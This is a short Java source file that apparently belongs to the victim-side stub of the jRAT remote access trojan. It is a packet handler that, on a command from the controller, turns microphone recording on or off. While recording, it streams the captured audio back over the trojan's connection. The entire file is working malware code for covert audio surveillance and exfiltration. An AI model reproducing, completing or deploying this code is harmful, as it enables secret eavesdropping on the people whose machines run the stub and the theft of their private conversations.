package se.jrat.stub.packets.incoming;

import se.jrat.common.SoundWriter;
import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet58ClientUploadSoundCapture;

public class Packet84ToggleSoundCapture extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.instance.readBoolean()) {
			new Thread(new SoundWriter() {
				@Override
				public void onRead(byte[] data, int read) throws Exception {
					Connection.instance.addToSendQueue(new Packet58ClientUploadSoundCapture(data, read));	
				}
			}).start();
		} else {
			SoundWriter.instance.running = false;
		}
	}

}
